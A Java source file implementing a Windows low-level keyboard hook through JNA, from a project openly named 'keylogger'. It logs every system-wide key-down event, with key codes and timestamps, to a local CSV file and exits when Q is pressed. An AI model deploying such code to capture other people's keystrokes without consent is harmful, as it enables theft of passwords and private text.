package co.uk.baconi.keylogger.hooks;

import static co.uk.baconi.keylogger.framework.constants.Strings.COMMA;
import static co.uk.baconi.utils.StringUtil.concat;
import co.uk.baconi.utils.LoggerUtil;
import co.uk.baconi.utils.TimeUtil;

import com.sun.jna.platform.win32.User32;
import com.sun.jna.platform.win32.WinDef.LRESULT;
import com.sun.jna.platform.win32.WinDef.WPARAM;
import com.sun.jna.platform.win32.WinUser;
import com.sun.jna.platform.win32.WinUser.KBDLLHOOKSTRUCT;
import com.sun.jna.platform.win32.WinUser.LowLevelKeyboardProc;

public final class WindowsKeyboardHook implements LowLevelKeyboardProc {
    private static final int Q_KEY_VKCODE = 81;

    private static final String[] LOG_HEADINGS = { "wParam", "vkCode", "flags", "scanCode", "dwExtraInfo", "time",
            "Year-Month-Day", "Hour:Minute:Second:Millisecond" };

    private static final LoggerUtil LOGGER = LoggerUtil.getLogger("KeyHookLog.csv", false, true, LOG_HEADINGS);

    private final WindowsKeyboardHookParent parent;

    public WindowsKeyboardHook(final WindowsKeyboardHookParent parent) {
        this.parent = parent;
    }

    @Override
    public LRESULT callback(final int nCode, final WPARAM wParam, final KBDLLHOOKSTRUCT info) {
        if (nCode >= 0) {
            if (wParam.intValue() == WinUser.WM_KEYDOWN) {
                LOGGER.log(concat(wParam, COMMA, info.vkCode, COMMA, info.flags, COMMA, info.scanCode, COMMA,
                        info.dwExtraInfo, COMMA, info.time, COMMA, TimeUtil.getCurrentDateTime()));

                if (info.vkCode == Q_KEY_VKCODE) {
                    parent.quit();
                }
            }
        }
        return User32.INSTANCE.CallNextHookEx(parent.getHHOOK(), nCode, wParam, info.getPointer());
    }
}
